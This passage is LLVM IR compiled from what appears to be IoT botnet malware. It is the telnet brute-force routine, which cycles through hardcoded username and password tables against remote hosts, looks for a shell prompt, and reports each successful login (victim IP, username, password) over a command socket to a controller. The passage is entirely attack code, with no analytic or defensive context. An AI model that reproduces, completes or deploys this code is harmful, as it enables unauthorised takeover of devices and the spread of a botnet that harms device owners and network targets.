  %713 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %712, i32 0, i32 0
  %714 = load i32, i32* %713, align 16
  %715 = call i64 @send(i32 %714, i8* getelementptr inbounds ([3 x i8], [3 x i8]* @.str.26, i32 0, i32 0), i64 2, i32 16384)
  %716 = icmp slt i64 %715, 0
  br i1 %716, label %717, label %732

; <label>:717:                                    ; preds = %709
  %718 = load i32, i32* %4, align 4
  %719 = sext i32 %718 to i64
  %720 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %34, i64 %719
  %721 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %720, i32 0, i32 0
  %722 = load i32, i32* %721, align 16
  %723 = call i32 @sclose(i32 %722)
  %724 = load i32, i32* %4, align 4
  %725 = sext i32 %724 to i64
  %726 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %34, i64 %725
  %727 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %726, i32 0, i32 2
  store i8 0, i8* %727, align 8
  %728 = load i32, i32* %4, align 4
  %729 = sext i32 %728 to i64
  %730 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %34, i64 %729
  %731 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %730, i32 0, i32 3
  store i8 1, i8* %731, align 1
  br label %1172

; <label>:732:                                    ; preds = %709
  %733 = load i32, i32* %4, align 4
  %734 = sext i32 %733 to i64
  %735 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %34, i64 %734
  %736 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %735, i32 0, i32 2
  store i8 6, i8* %736, align 8
  br label %1171

; <label>:737:                                    ; preds = %70
  %738 = load i32, i32* %4, align 4
  %739 = sext i32 %738 to i64
  %740 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %34, i64 %739
  %741 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %740, i32 0, i32 6
  %742 = load i32, i32* %741, align 4
  %743 = icmp eq i32 %742, 0
  br i1 %743, label %744, label %750

; <label>:744:                                    ; preds = %737
  %745 = call i32 (i8*, ...) bitcast (i32 (...)* @time to i32 (i8*, ...)*)(i8* null)
  %746 = load i32, i32* %4, align 4
  %747 = sext i32 %746 to i64
  %748 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %34, i64 %747
  %749 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %748, i32 0, i32 6
  store i32 %745, i32* %749, align 4
  br label %750

; <label>:750:                                    ; preds = %744, %737
  %751 = load i32, i32* %4, align 4
  %752 = sext i32 %751 to i64
  %753 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %34, i64 %752
  %754 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %753, i32 0, i32 0
  %755 = load i32, i32* %754, align 16
  %756 = load i32, i32* %4, align 4
  %757 = sext i32 %756 to i64
  %758 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %34, i64 %757
  %759 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %758, i32 0, i32 8
  %760 = load i8*, i8** %759, align 8
  %761 = load i32, i32* %4, align 4
  %762 = sext i32 %761 to i64
  %763 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %34, i64 %762
  %764 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %763, i32 0, i32 7
  %765 = load i16, i16* %764, align 16
  %766 = zext i16 %765 to i32
  %767 = call i32 @readUntil(i32 %755, i8* getelementptr inbounds ([9 x i8], [9 x i8]* @.str.28, i32 0, i32 0), i32 1, i32 0, i32 10000, i8* %760, i32 1024, i32 %766)
  %768 = icmp ne i32 %767, 0
  br i1 %768, label %769, label %844

; <label>:769:                                    ; preds = %750
  %770 = load i32, i32* %4, align 4
  %771 = sext i32 %770 to i64
  %772 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %34, i64 %771
  %773 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %772, i32 0, i32 6
  store i32 0, i32* %773, align 4
  %774 = load i32, i32* %4, align 4
  %775 = sext i32 %774 to i64
  %776 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %34, i64 %775
  %777 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %776, i32 0, i32 7
  store i16 0, i16* %777, align 16
  %778 = load i32, i32* %4, align 4
  %779 = sext i32 %778 to i64
  %780 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %34, i64 %779
  %781 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %780, i32 0, i32 8
  %782 = load i8*, i8** %781, align 8
  %783 = call i8* @strstr(i8* %782, i8* getelementptr inbounds ([9 x i8], [9 x i8]* @.str.28, i32 0, i32 0)) #10
  %784 = icmp ne i8* %783, null
  br i1 %784, label %785, label %805

; <label>:785:                                    ; preds = %769
  %786 = load i32, i32* %4, align 4
  %787 = sext i32 %786 to i64
  %788 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %34, i64 %787
  %789 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %788, i32 0, i32 8
  %790 = load i8*, i8** %789, align 8
  call void @llvm.memset.p0i8.i64(i8* %790, i8 0, i64 1024, i32 1, i1 false)
  %791 = load i32, i32* %4, align 4
  %792 = sext i32 %791 to i64
  %793 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %34, i64 %792
  %794 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %793, i32 0, i32 0
  %795 = load i32, i32* %794, align 16
  %796 = call i32 @sclose(i32 %795)
  %797 = load i32, i32* %4, align 4
  %798 = sext i32 %797 to i64
  %799 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %34, i64 %798
  %800 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %799, i32 0, i32 2
  store i8 0, i8* %800, align 8
  %801 = load i32, i32* %4, align 4
  %802 = sext i32 %801 to i64
  %803 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %34, i64 %802
  %804 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %803, i32 0, i32 3
  store i8 0, i8* %804, align 1
  br label %1172

; <label>:805:                                    ; preds = %769
  %806 = load i32, i32* %4, align 4
  %807 = sext i32 %806 to i64
  %808 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %34, i64 %807
  %809 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %808, i32 0, i32 8
  %810 = load i8*, i8** %809, align 8
  %811 = call i32 @matchPrompt(i8* %810)
  %812 = icmp ne i32 %811, 0
  br i1 %812, label %833, label %813

; <label>:813:                                    ; preds = %805
  %814 = load i32, i32* %4, align 4
  %815 = sext i32 %814 to i64
  %816 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %34, i64 %815
  %817 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %816, i32 0, i32 8
  %818 = load i8*, i8** %817, align 8
  call void @llvm.memset.p0i8.i64(i8* %818, i8 0, i64 1024, i32 1, i1 false)
  %819 = load i32, i32* %4, align 4
  %820 = sext i32 %819 to i64
  %821 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %34, i64 %820
  %822 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %821, i32 0, i32 0
  %823 = load i32, i32* %822, align 16
  %824 = call i32 @sclose(i32 %823)
  %825 = load i32, i32* %4, align 4
  %826 = sext i32 %825 to i64
  %827 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %34, i64 %826
  %828 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %827, i32 0, i32 2
  store i8 0, i8* %828, align 8
  %829 = load i32, i32* %4, align 4
  %830 = sext i32 %829 to i64
  %831 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %34, i64 %830
  %832 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %831, i32 0, i32 3
  store i8 1, i8* %832, align 1
  br label %1172

; <label>:833:                                    ; preds = %805
  %834 = load i32, i32* %4, align 4
  %835 = sext i32 %834 to i64
  %836 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %34, i64 %835
  %837 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %836, i32 0, i32 2
  store i8 7, i8* %837, align 8
  br label %838

; <label>:838:                                    ; preds = %833
  %839 = load i32, i32* %4, align 4
  %840 = sext i32 %839 to i64
  %841 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %34, i64 %840
  %842 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %841, i32 0, i32 8
  %843 = load i8*, i8** %842, align 8
  call void @llvm.memset.p0i8.i64(i8* %843, i8 0, i64 1024, i32 1, i1 false)
  br label %1172

; <label>:844:                                    ; preds = %750
  %845 = load i32, i32* %4, align 4
  %846 = sext i32 %845 to i64
  %847 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %34, i64 %846
  %848 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %847, i32 0, i32 8
  %849 = load i8*, i8** %848, align 8
  %850 = call i64 @strlen(i8* %849) #10
  %851 = trunc i64 %850 to i16
  %852 = load i32, i32* %4, align 4
  %853 = sext i32 %852 to i64
  %854 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %34, i64 %853
  %855 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %854, i32 0, i32 7
  store i16 %851, i16* %855, align 16
  br label %856

; <label>:856:                                    ; preds = %844
  %857 = load i32, i32* %4, align 4
  %858 = sext i32 %857 to i64
  %859 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %34, i64 %858
  %860 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %859, i32 0, i32 6
  %861 = load i32, i32* %860, align 4
  %862 = add i32 %861, 30
  %863 = call i32 (i8*, ...) bitcast (i32 (...)* @time to i32 (i8*, ...)*)(i8* null)
  %864 = icmp ult i32 %862, %863
  br i1 %864, label %865, label %880

; <label>:865:                                    ; preds = %856
  %866 = load i32, i32* %4, align 4
  %867 = sext i32 %866 to i64
  %868 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %34, i64 %867
  %869 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %868, i32 0, i32 0
  %870 = load i32, i32* %869, align 16
  %871 = call i32 @sclose(i32 %870)
  %872 = load i32, i32* %4, align 4
  %873 = sext i32 %872 to i64
  %874 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %34, i64 %873
  %875 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %874, i32 0, i32 2
  store i8 0, i8* %875, align 8
  %876 = load i32, i32* %4, align 4
  %877 = sext i32 %876 to i64
  %878 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %34, i64 %877
  %879 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %878, i32 0, i32 3
  store i8 1, i8* %879, align 1
  br label %880

; <label>:880:                                    ; preds = %865, %856
  br label %1171

; <label>:881:                                    ; preds = %70
  %882 = load i32, i32* %4, align 4
  %883 = sext i32 %882 to i64
  %884 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %34, i64 %883
  %885 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %884, i32 0, i32 0
  %886 = load i32, i32* %885, align 16
  %887 = call i64 @send(i32 %886, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.29, i32 0, i32 0), i64 4, i32 16384)
  %888 = icmp slt i64 %887, 0
  br i1 %888, label %889, label %904

; <label>:889:                                    ; preds = %881
  %890 = load i32, i32* %4, align 4
  %891 = sext i32 %890 to i64
  %892 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %34, i64 %891
  %893 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %892, i32 0, i32 0
  %894 = load i32, i32* %893, align 16
  %895 = call i32 @sclose(i32 %894)
  %896 = load i32, i32* %4, align 4
  %897 = sext i32 %896 to i64
  %898 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %34, i64 %897
  %899 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %898, i32 0, i32 2
  store i8 0, i8* %899, align 8
  %900 = load i32, i32* %4, align 4
  %901 = sext i32 %900 to i64
  %902 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %34, i64 %901
  %903 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %902, i32 0, i32 3
  store i8 1, i8* %903, align 1
  br label %1172

; <label>:904:                                    ; preds = %881
  %905 = load i32, i32* %4, align 4
  %906 = sext i32 %905 to i64
  %907 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %34, i64 %906
  %908 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %907, i32 0, i32 2
  store i8 8, i8* %908, align 8
  br label %1171

; <label>:909:                                    ; preds = %70
  %910 = load i32, i32* %4, align 4
  %911 = sext i32 %910 to i64
  %912 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %34, i64 %911
  %913 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %912, i32 0, i32 0
  %914 = load i32, i32* %913, align 16
  %915 = call i64 @send(i32 %914, i8* getelementptr inbounds ([8 x i8], [8 x i8]* @.str.30, i32 0, i32 0), i64 7, i32 16384)
  %916 = icmp slt i64 %915, 0
  br i1 %916, label %917, label %932

; <label>:917:                                    ; preds = %909
  %918 = load i32, i32* %4, align 4
  %919 = sext i32 %918 to i64
  %920 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %34, i64 %919
  %921 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %920, i32 0, i32 0
  %922 = load i32, i32* %921, align 16
  %923 = call i32 @sclose(i32 %922)
  %924 = load i32, i32* %4, align 4
  %925 = sext i32 %924 to i64
  %926 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %34, i64 %925
  %927 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %926, i32 0, i32 2
  store i8 0, i8* %927, align 8
  %928 = load i32, i32* %4, align 4
  %929 = sext i32 %928 to i64
  %930 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %34, i64 %929
  %931 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %930, i32 0, i32 3
  store i8 1, i8* %931, align 1
  br label %1172

; <label>:932:                                    ; preds = %909
  %933 = load i32, i32* %4, align 4
  %934 = sext i32 %933 to i64
  %935 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %34, i64 %934
  %936 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %935, i32 0, i32 2
  store i8 9, i8* %936, align 8
  br label %1171

; <label>:937:                                    ; preds = %70
  %938 = load i32, i32* %4, align 4
  %939 = sext i32 %938 to i64
  %940 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %34, i64 %939
  %941 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %940, i32 0, i32 0
  %942 = load i32, i32* %941, align 16
  %943 = call i64 @send(i32 %942, i8* getelementptr inbounds ([181 x i8], [181 x i8]* @.str.31, i32 0, i32 0), i64 207, i32 16384)
  %944 = icmp slt i64 %943, 0
  br i1 %944, label %945, label %960

; <label>:945:                                    ; preds = %937
  %946 = load i32, i32* %4, align 4
  %947 = sext i32 %946 to i64
  %948 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %34, i64 %947
  %949 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %948, i32 0, i32 0
  %950 = load i32, i32* %949, align 16
  %951 = call i32 @sclose(i32 %950)
  %952 = load i32, i32* %4, align 4
  %953 = sext i32 %952 to i64
  %954 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %34, i64 %953
  %955 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %954, i32 0, i32 2
  store i8 0, i8* %955, align 8
  %956 = load i32, i32* %4, align 4
  %957 = sext i32 %956 to i64
  %958 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %34, i64 %957
  %959 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %958, i32 0, i32 3
  store i8 1, i8* %959, align 1
  br label %1172

; <label>:960:                                    ; preds = %937
  %961 = load i32, i32* %4, align 4
  %962 = sext i32 %961 to i64
  %963 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %34, i64 %962
  %964 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %963, i32 0, i32 2
  store i8 10, i8* %964, align 8
  br label %1171

; <label>:965:                                    ; preds = %70
  %966 = load i32, i32* %4, align 4
  %967 = sext i32 %966 to i64
  %968 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %34, i64 %967
  %969 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %968, i32 0, i32 0
  %970 = load i32, i32* %969, align 16
  %971 = call i64 @send(i32 %970, i8* getelementptr inbounds ([181 x i8], [181 x i8]* @.str.31, i32 0, i32 0), i64 207, i32 16384)
  %972 = icmp slt i64 %971, 0
  br i1 %972, label %973, label %988

; <label>:973:                                    ; preds = %965
  %974 = load i32, i32* %4, align 4
  %975 = sext i32 %974 to i64
  %976 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %34, i64 %975
  %977 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %976, i32 0, i32 0
  %978 = load i32, i32* %977, align 16
  %979 = call i32 @sclose(i32 %978)
  %980 = load i32, i32* %4, align 4
  %981 = sext i32 %980 to i64
  %982 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %34, i64 %981
  %983 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %982, i32 0, i32 2
  store i8 0, i8* %983, align 8
  %984 = load i32, i32* %4, align 4
  %985 = sext i32 %984 to i64
  %986 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %34, i64 %985
  %987 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %986, i32 0, i32 3
  store i8 1, i8* %987, align 1
  br label %1172

; <label>:988:                                    ; preds = %965
  %989 = load i32, i32* %4, align 4
  %990 = sext i32 %989 to i64
  %991 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %34, i64 %990
  %992 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %991, i32 0, i32 2
  store i8 11, i8* %992, align 8
  br label %1171

; <label>:993:                                    ; preds = %70
  %994 = load i32, i32* %4, align 4
  %995 = sext i32 %994 to i64
  %996 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %34, i64 %995
  %997 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %996, i32 0, i32 6
  %998 = load i32, i32* %997, align 4
  %999 = icmp eq i32 %998, 0
  br i1 %999, label %1000, label %1006

; <label>:1000:                                   ; preds = %993
  %1001 = call i32 (i8*, ...) bitcast (i32 (...)* @time to i32 (i8*, ...)*)(i8* null)
  %1002 = load i32, i32* %4, align 4
  %1003 = sext i32 %1002 to i64
  %1004 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %34, i64 %1003
  %1005 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1004, i32 0, i32 6
  store i32 %1001, i32* %1005, align 4
  br label %1006

; <label>:1006:                                   ; preds = %1000, %993
  %1007 = load i32, i32* %4, align 4
  %1008 = sext i32 %1007 to i64
  %1009 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %34, i64 %1008
  %1010 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1009, i32 0, i32 0
  %1011 = load i32, i32* %1010, align 16
  %1012 = load i32, i32* %4, align 4
  %1013 = sext i32 %1012 to i64
  %1014 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %34, i64 %1013
  %1015 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1014, i32 0, i32 8
  %1016 = load i8*, i8** %1015, align 8
  %1017 = load i32, i32* %4, align 4
  %1018 = sext i32 %1017 to i64
  %1019 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %34, i64 %1018
  %1020 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1019, i32 0, i32 7
  %1021 = load i16, i16* %1020, align 16
  %1022 = zext i16 %1021 to i32
  %1023 = call i32 @readUntil(i32 %1011, i8* getelementptr inbounds ([10 x i8], [10 x i8]* @.str.32, i32 0, i32 0), i32 0, i32 0, i32 10000, i8* %1016, i32 1024, i32 %1022)
  %1024 = icmp ne i32 %1023, 0
  br i1 %1024, label %1025, label %1060

; <label>:1025:                                   ; preds = %1006
  %1026 = load i32, i32* %4, align 4
  %1027 = sext i32 %1026 to i64
  %1028 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %34, i64 %1027
  %1029 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1028, i32 0, i32 6
  store i32 0, i32* %1029, align 4
  %1030 = load i32, i32* %4, align 4
  %1031 = sext i32 %1030 to i64
  %1032 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %34, i64 %1031
  %1033 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1032, i32 0, i32 7
  store i16 0, i16* %1033, align 16
  %1034 = load i32, i32* @mainCommSock, align 4
  %1035 = load i32, i32* %4, align 4
  %1036 = sext i32 %1035 to i64
  %1037 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %34, i64 %1036
  %1038 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1037, i32 0, i32 1
  %1039 = bitcast i32* %1038 to %struct.in_addr*
  %1040 = getelementptr inbounds %struct.in_addr, %struct.in_addr* %1039, i32 0, i32 0
  %1041 = load i32, i32* %1040, align 4
  %1042 = call i8* @inet_ntoa(i32 %1041) #2
  %1043 = load i32, i32* %4, align 4
  %1044 = sext i32 %1043 to i64
  %1045 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %34, i64 %1044
  %1046 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1045, i32 0, i32 4
  %1047 = load i8, i8* %1046, align 2
  %1048 = zext i8 %1047 to i64
  %1049 = getelementptr inbounds [6 x i8*], [6 x i8*]* @usernames, i64 0, i64 %1048
  %1050 = load i8*, i8** %1049, align 8
  %1051 = load i32, i32* %4, align 4
  %1052 = sext i32 %1051 to i64
  %1053 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %34, i64 %1052
  %1054 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1053, i32 0, i32 5
  %1055 = load i8, i8* %1054, align 1
  %1056 = zext i8 %1055 to i64
  %1057 = getelementptr inbounds [14 x i8*], [14 x i8*]* @passwords, i64 0, i64 %1056
  %1058 = load i8*, i8** %1057, align 8
  %1059 = call i32 (i32, i8*, ...) @sockprintf(i32 %1034, i8* getelementptr inbounds ([16 x i8], [16 x i8]* @.str.33, i32 0, i32 0), i8* %1042, i8* %1050, i8* %1058)
  br label %1172

; <label>:1060:                                   ; preds = %1006
  %1061 = load i32, i32* %4, align 4
  %1062 = sext i32 %1061 to i64
  %1063 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %34, i64 %1062
  %1064 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1063, i32 0, i32 0
  %1065 = load i32, i32* %1064, align 16
  %1066 = load i32, i32* %4, align 4
  %1067 = sext i32 %1066 to i64
  %1068 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %34, i64 %1067
  %1069 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1068, i32 0, i32 8
  %1070 = load i8*, i8** %1069, align 8
  %1071 = load i32, i32* %4, align 4
  %1072 = sext i32 %1071 to i64
  %1073 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %34, i64 %1072
  %1074 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1073, i32 0, i32 7
  %1075 = load i16, i16* %1074, align 16
  %1076 = zext i16 %1075 to i32
  %1077 = call i32 @readUntil(i32 %1065, i8* getelementptr inbounds ([7 x i8], [7 x i8]* @.str.34, i32 0, i32 0), i32 0, i32 0, i32 10000, i8* %1070, i32 1024, i32 %1076)
  %1078 = icmp ne i32 %1077, 0
  br i1 %1078, label %1079, label %1133

; <label>:1079:                                   ; preds = %1060
  %1080 = load i32, i32* %4, align 4
  %1081 = sext i32 %1080 to i64
  %1082 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %34, i64 %1081
  %1083 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1082, i32 0, i32 6
  store i32 0, i32* %1083, align 4
  %1084 = load i32, i32* %4, align 4
  %1085 = sext i32 %1084 to i64
  %1086 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %34, i64 %1085
  %1087 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1086, i32 0, i32 7
  store i16 0, i16* %1087, align 16
  %1088 = load i32, i32* @mainCommSock, align 4
  %1089 = load i32, i32* %4, align 4
  %1090 = sext i32 %1089 to i64
  %1091 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %34, i64 %1090
  %1092 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1091, i32 0, i32 1
  %1093 = bitcast i32* %1092 to %struct.in_addr*
  %1094 = getelementptr inbounds %struct.in_addr, %struct.in_addr* %1093, i32 0, i32 0
  %1095 = load i32, i32* %1094, align 4
  %1096 = call i8* @inet_ntoa(i32 %1095) #2
  %1097 = load i32, i32* %4, align 4
  %1098 = sext i32 %1097 to i64
  %1099 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %34, i64 %1098
  %1100 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1099, i32 0, i32 4
  %1101 = load i8, i8* %1100, align 2
  %1102 = zext i8 %1101 to i64
  %1103 = getelementptr inbounds [6 x i8*], [6 x i8*]* @usernames, i64 0, i64 %1102
  %1104 = load i8*, i8** %1103, align 8
  %1105 = load i32, i32* %4, align 4
  %1106 = sext i32 %1105 to i64
  %1107 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %34, i64 %1106
  %1108 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1107, i32 0, i32 5
  %1109 = load i8, i8* %1108, align 1
  %1110 = zext i8 %1109 to i64
  %1111 = getelementptr inbounds [14 x i8*], [14 x i8*]* @passwords, i64 0, i64 %1110
  %1112 = load i8*, i8** %1111, align 8
  %1113 = call i32 (i32, i8*, ...) @sockprintf(i32 %1088, i8* getelementptr inbounds ([16 x i8], [16 x i8]* @.str.33, i32 0, i32 0), i8* %1096, i8* %1104, i8* %1112)
  %1114 = load i32, i32* %4, align 4
  %1115 = sext i32 %1114 to i64
  %1116 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %34, i64 %1115
  %1117 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1116, i32 0, i32 8
  %1118 = load i8*, i8** %1117, align 8
  call void @llvm.memset.p0i8.i64(i8* %1118, i8 0, i64 1024, i32 1, i1 false)
  %1119 = load i32, i32* %4, align 4
  %1120 = sext i32 %1119 to i64
  %1121 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %34, i64 %1120
  %1122 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1121, i32 0, i32 0
  %1123 = load i32, i32* %1122, align 16
  %1124 = call i32 @sclose(i32 %1123)
  %1125 = load i32, i32* %4, align 4
  %1126 = sext i32 %1125 to i64
  %1127 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %34, i64 %1126
  %1128 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1127, i32 0, i32 3
  store i8 1, i8* %1128, align 1
  %1129 = load i32, i32* %4, align 4
  %1130 = sext i32 %1129 to i64
  %1131 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %34, i64 %1130
  %1132 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1131, i32 0, i32 2
  store i8 0, i8* %1132, align 8
  br label %1172

; <label>:1133:                                   ; preds = %1060
  %1134 = load i32, i32* %4, align 4
  %1135 = sext i32 %1134 to i64
  %1136 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %34, i64 %1135
  %1137 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1136, i32 0, i32 8
  %1138 = load i8*, i8** %1137, align 8
  %1139 = call i64 @strlen(i8* %1138) #10
  %1140 = trunc i64 %1139 to i16
  %1141 = load i32, i32* %4, align 4
  %1142 = sext i32 %1141 to i64
  %1143 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %34, i64 %1142
  %1144 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1143, i32 0, i32 7
  store i16 %1140, i16* %1144, align 16
  br label %1145

; <label>:1145:                                   ; preds = %1133
  br label %1146

; <label>:1146:                                   ; preds = %1145
  %1147 = load i32, i32* %4, align 4
  %1148 = sext i32 %1147 to i64
  %1149 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %34, i64 %1148
  %1150 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1149, i32 0, i32 6
  %1151 = load i32, i32* %1150, align 4
  %1152 = add i32 %1151, 30
  %1153 = call i32 (i8*, ...) bitcast (i32 (...)* @time to i32 (i8*, ...)*)(i8* null)
  %1154 = icmp ult i32 %1152, %1153
  br i1 %1154, label %1155, label %1170

; <label>:1155:                                   ; preds = %1146
  %1156 = load i32, i32* %4, align 4
  %1157 = sext i32 %1156 to i64
  %1158 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %34, i64 %1157
  %1159 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1158, i32 0, i32 0
  %1160 = load i32, i32* %1159, align 16
  %1161 = call i32 @sclose(i32 %1160)
  %1162 = load i32, i32* %4, align 4
  %1163 = sext i32 %1162 to i64
  %1164 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %34, i64 %1163
  %1165 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1164, i32 0, i32 2
  store i8 0, i8* %1165, align 8
